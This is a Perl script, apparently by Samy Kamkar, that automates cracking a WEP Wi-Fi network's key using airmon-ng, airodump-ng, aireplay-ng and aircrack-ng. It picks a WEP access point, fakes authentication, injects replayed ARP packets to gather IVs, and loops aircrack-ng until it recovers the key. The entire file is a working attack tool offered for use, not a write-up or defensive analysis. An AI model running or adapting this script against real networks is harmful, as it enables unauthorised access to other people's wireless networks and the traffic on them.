#!/usr/bin/perl

# by samy kamkar

use strict;

my $interface = shift || "wlan0";

my $airmon	= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $aircrack	= "aircrack-ng";
my $airodump	= "airodump-ng";

# stop + start interface
system($airmon, "start", $interface);

print "Please find an AP to use. When found, hit CTRL+C.\n";
print "[remember part of the name or part of BSSID]\n";

# tmpfile for ap output
my $tmpfile = "/tmp/airsamy" . rand();
unlink(glob("$tmpfile*"));

# show user APs
eval {
	local $SIG{INT} = sub { die };
	open(DUMP, "$airodump --output-format csv -w $tmpfile $interface|") || die "Can't run airodump ($airodump): $!";
};
close(DUMP);

# read in APs
my %aps;
my ($tmpfile1) = glob("$tmpfile*");
open(APS, "<$tmpfile1") || die "Can't read tmp file $tmpfile1: $!";
while (<APS>)
{
	chomp;
	s/://g;
	s/\s+/ /g;
	$aps{$_} = 1;
}
close(APS);
unlink($tmpfile1);

# ask for AP
my ($input, $ap);
while (!$ap)
{
	my $found = 0;

	print "\nPlease enter part of the name/bssid of the AP: ";
	chomp($input = <STDIN>);
	$input =~ s/://g;
	print "\n";

	foreach my $tmpap (keys %aps)
	{
		my @data = split(/\s*,\s+/, $tmpap);
		if ($tmpap =~ /$input/i)
		{
			print "Found: $data[0] ($data[13]) ch=$data[3] mb=$data[4] enc=$data[5] $data[6] $data[7]";
			if ($data[5] !~ /WEP/)
			{
				print " -- NOT WEP!";
			}
			else
			{
				$found++;
				$ap = $tmpap;
			}
			print "\n";
		}
	}

	if ($found > 1)
	{
		$ap = undef;
		print "\nPlease be more specific.\n\n";
	}
}

# get ap info
my @data = split(/\s*,\s+/, $ap);
my ($bssid, $essid, $chan) = ($data[0], $data[13], $data[3]);

# start on channel
system($airmon, "start", $interface, $chan);

# test injection
system($aireplay, "-9", "-e", $essid, "-a", $bssid, $interface);

# fake auth with the AP
system($aireplay, "-1", "0", "-e", $essid, "-a", $bssid, $interface);

# fork off, capture IVs in front
if (fork())
{
	# capture IVs
	system($airodump, "-c", $chan, "--bssid", $bssid, "-w", $tmpfile, $interface);

	# crack!
	#system($aircrack, "-z", glob("$tmpfile*cap"));

	# remove extra files
	unlink(glob("$tmpfile*"));
}

# do background stuff to produce packets
else
{
	sleep(1);

	# crack until we find something
	if (fork())
	{
		my ($key);
		while (!$key)
		{
			open(CRACK, "$aircrack -z " . join(" ", glob("$tmpfile*cap")) . "|");
			while (<CRACK>)
			{
				if (/correctly:\s*100%/)
				{
					$key = 1;
					close(CRACK);
				}
			}
		}

		system("killall", "-9", $aireplay, $airodump);
		system($aircrack, "-z", glob("$tmpfile*cap"));
	}

	# inject arps
	else
	{
		# capture an ARP and replay
		system($aireplay, "-3", "-b", $bssid, $interface);
	}
}
	

